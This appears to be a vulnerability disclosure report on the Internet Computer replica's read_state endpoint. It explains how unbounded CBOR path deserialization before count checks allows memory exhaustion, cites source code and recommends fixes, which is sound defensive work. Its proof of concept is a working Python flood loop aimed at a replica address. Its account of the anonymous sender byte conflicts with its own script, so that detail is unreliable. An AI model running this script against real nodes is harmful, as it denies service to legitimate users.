### Title
Unbounded CBOR Deserialization of `read_state` Paths Before Count Validation Enables Replica Memory Exhaustion - (File: `rs/http_endpoints/public/src/read_state.rs`)

---

### Summary
The replica's public `read_state` HTTP handler explicitly disables the body size limit and fully deserializes the attacker-controlled `paths` field into heap memory before any path-count or label-count validation occurs. An unprivileged `read_state` caller can send a crafted request with millions of paths, forcing the replica to perform massive heap allocations before the request is rejected.

---

### Finding Description

The `read_state` handler is registered with `DefaultBodyLimit::disable()`, removing the axum default 2 MB body cap entirely: [1](#0-0) 

The axum `Cbor` extractor then reads the entire uncapped body into memory and calls `serde_cbor::from_slice`, deserializing the full `HttpRequestEnvelope<HttpReadStateContent>` — including the `paths: Vec<Path>` field — without any count check: [2](#0-1) 

The `HttpReadState` type carries `paths: Vec<Path>` with no bound: [3](#0-2) 

Only **after** this full deserialization does the code call `validator.validate_request(...)` inside a `spawn_blocking` task, where `MAXIMUM_NUMBER_OF_PATHS = 1_000` and `MAXIMUM_NUMBER_OF_LABELS_PER_PATH = 127` are finally enforced: [4](#0-3) [5](#0-4) 

After validation passes (or even before rejection on count), `verify_paths` constructs a `Vec<Vec<&[u8]>>` from all paths: [6](#0-5) 

And `get_certificate_and_create_response` calls `sparse_labeled_tree_from_paths`, which sorts all paths — an O(N log N) operation over attacker-controlled data: [7](#0-6) [8](#0-7) 

A secondary, acknowledged gap exists in the boundary node's `preprocess_request`, where the `paths: Option<Vec<Vec<Blob>>>` field in `ICRequestContent` also carries no count limit during CBOR deserialization, with a developer TODO noting the missing sanity checks: [9](#0-8) 

---

### Impact Explanation

An attacker sends a `read_state` request with, e.g., 5 million paths each containing a 1-byte label. The CBOR body is ~15–20 MB (no body limit). The replica allocates:
- 5 million `Path` objects (`Vec<Label>`)
- 5 million `Label` objects (`Vec<u8>`)
- A `Vec<Vec<&[u8]>>` copy in `verify_paths`

All of this occurs before the `TooManyPathsError` rejection. Repeated rapid requests exhaust replica heap memory, causing OOM kills or severe GC pressure, denying service to legitimate users on that replica node.

---

### Likelihood Explanation

The `/api/v2/canister/.../read_state` and `/api/v3/canister/.../read_state` endpoints are publicly reachable by any unprivileged user. An anonymous sender (single zero byte) is accepted. No prior authentication, cycles, or canister deployment is required. The attacker only needs to craft a CBOR payload and send it over HTTP/2 to any replica's public port.

---

### Recommendation

1. **Remove `DefaultBodyLimit::disable()`** from the `read_state` route and replace it with a reasonable cap (e.g., 5 MB), consistent with the boundary node's `MAX_REQUEST_BODY_SIZE`.
2. **Add an early path-count check** immediately after CBOR deserialization (before `try_from` conversion), rejecting requests with more than `MAXIMUM_NUMBER_OF_PATHS` paths before any heap allocation of path structures.
3. **Address the boundary node TODO** in `ICRequestContent` by adding a bounded deserializer for the `paths` field analogous to the existing `check_method_name_length` guard.

---

### Proof of Concept

```python
import cbor2, requests, time

# 100,000 paths — 100x the allowed limit of 1,000
# Each path is a single 1-byte label; total body ~3 MB
paths = [[b"t"]] * 100_000

envelope = {
    "content": {
        "request_type": "read_state",
        "sender": bytes([4]),          # anonymous principal
        "paths": paths,
        "ingress_expiry": 2**63 - 1,
    }
}

body = cbor2.dumps(envelope)
print(f"Body size: {len(body):,} bytes")

# Flood the replica — each request forces full path deserialization
# before rejection, consuming replica heap memory
target = "http://<replica_ip>:8080/api/v2/canister/aaaaa-aa/read_state"
while True:
    requests.post(target, data=body,
                  headers={"Content-Type": "application/cbor"}, timeout=10)
    time.sleep(0.01)
```

Each request forces the replica to allocate memory for 100,000 `Path` objects before returning a `TooManyPathsError`. Sustained at ~100 req/s, this continuously pressures the replica heap without any rate-limiting gate being reached first, since the rejection occurs before the ingress pool or rate-limit logic is consulted.

### Citations

**File:** rs/http_endpoints/public/src/read_state.rs (L187-193)
```rust
        Router::new().route(
            ReadStateService::route(version, target),
            axum::routing::post(read_state)
                .with_state(state)
                .layer(ServiceBuilder::new().layer(DefaultBodyLimit::disable())),
        )
    }
```

**File:** rs/http_endpoints/public/src/read_state.rs (L217-236)
```rust
    WithTimeout(Cbor(request)): WithTimeout<Cbor<HttpRequestEnvelope<HttpReadStateContent>>>,
) -> impl IntoResponse {
    if health_status.load() != ReplicaHealthStatus::Healthy {
        let status = StatusCode::SERVICE_UNAVAILABLE;
        let text = format!(
            "Replica is unhealthy: {:?}. Check the /api/v2/status for more information.",
            health_status.load(),
        );
        return (status, text).into_response();
    }

    // Convert the message to a strongly-typed struct.
    let request = match HttpRequest::<ReadState>::try_from(request) {
        Ok(request) => request,
        Err(e) => {
            let status = StatusCode::BAD_REQUEST;
            let text = format!("Malformed request: {e:?}");
            return (status, text).into_response();
        }
    };
```

**File:** rs/http_endpoints/public/src/read_state.rs (L252-263)
```rust
    let response = tokio::task::spawn_blocking(move || {
        let targets = match validator.validate_request(
            &request_c,
            time_source.get_relative_time(),
            &root_of_trust_provider,
        ) {
            Ok(targets) => targets,
            Err(err) => {
                let http_err = validation_error_to_http_error(&request, err, &log);
                return (http_err.status, http_err.message).into_response();
            }
        };
```

**File:** rs/http_endpoints/public/src/read_state.rs (L355-373)
```rust
fn get_certificate_and_create_response(
    mut paths: Vec<Path>,
    delegation_from_nns: Option<CertificateDelegation>,
    certified_state_reader: &dyn CertifiedStateSnapshot<State = ReplicatedState>,
    deprecated_canister_ranges_filter: DeprecatedCanisterRangesFilter,
) -> axum::response::Response {
    // Create labeled tree. This may be an expensive operation and by
    // creating the labeled tree after verifying the paths we know that
    // the depth is max 4.
    // Always add "time" to the paths even if not explicitly requested.
    paths.push(Path::from(Label::from("time")));
    let labeled_tree = match sparse_labeled_tree_from_paths(&paths) {
        Ok(tree) => tree,
        Err(TooLongPathError) => {
            let status = StatusCode::BAD_REQUEST;
            let text = "Failed to parse requested paths: path is too long.".to_string();
            return (status, text).into_response();
        }
    };
```

**File:** rs/http_endpoints/public/src/read_state.rs (L427-431)
```rust
    let paths: Vec<Vec<&[u8]>> = paths
        .iter()
        .map(|path| path.iter().map(|label| label.as_bytes()).collect())
        .collect();

```

**File:** rs/types/types/src/messages/http.rs (L230-238)
```rust
#[derive(Clone, Eq, PartialEq, Debug, Deserialize, Serialize)]
pub struct HttpReadState {
    pub sender: Blob,
    // A list of paths, where a path is itself a sequence of labels.
    pub paths: Vec<Path>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub nonce: Option<Blob>,
    pub ingress_expiry: u64,
}
```

**File:** rs/validator/src/ingress_validation.rs (L51-61)
```rust
/// Maximum number of paths that can be specified in a read state request. Requests having more paths
/// will be declared invalid without any further verification.
/// **Note**: this limit is part of the [IC specification](https://internetcomputer.org/docs/current/references/ic-interface-spec#http-read-state)
/// and so changing this value might be breaking or result in a deviation from the specification.
const MAXIMUM_NUMBER_OF_PATHS: usize = 1_000;

/// Maximum number of labels than can be specified in a single path inside a read state request.
/// Requests having a single path with more labels will be declared invalid without any further verification.
/// **Note**: this limit is part of the [IC specification](https://internetcomputer.org/docs/current/references/ic-interface-spec#http-read-state)
/// and so changing this value might be breaking or result in a deviation from the specification.
const MAXIMUM_NUMBER_OF_LABELS_PER_PATH: usize = 127;
```

**File:** rs/crypto/tree_hash/src/tree_hash.rs (L1010-1022)
```rust
pub fn sparse_labeled_tree_from_paths(paths: &[Path]) -> Result<LabeledTree<()>, TooLongPathError> {
    for path in paths {
        if path.len() >= (MAX_HASH_TREE_DEPTH as usize) {
            return Err(TooLongPathError {});
        }
    }
    // Sort all the paths. That way, if one path is a prefix of another, the prefix
    // is always first.
    let sorted_paths = {
        let mut paths_ref_vec: Vec<&Path> = paths.iter().collect();
        paths_ref_vec.sort_unstable();
        paths_ref_vec
    };
```

**File:** rs/boundary_node/ic_boundary/src/http/middleware/process.rs (L28-43)
```rust
/// This is the subset of the request fields.
///
/// TODO: add sanity checks for Blob fields so that
/// we don't process too big forged requests.
/// E.g. the nonce is probably fixed-length etc.
#[derive(Clone, Debug, Deserialize, Serialize)]
struct ICRequestContent {
    sender: Principal,
    canister_id: Option<Principal>,
    #[serde(default, deserialize_with = "check_method_name_length")]
    method_name: Option<String>,
    nonce: Option<Blob>,
    ingress_expiry: Option<u64>,
    arg: Option<Blob>,
    paths: Option<Vec<Vec<Blob>>>,
}
```
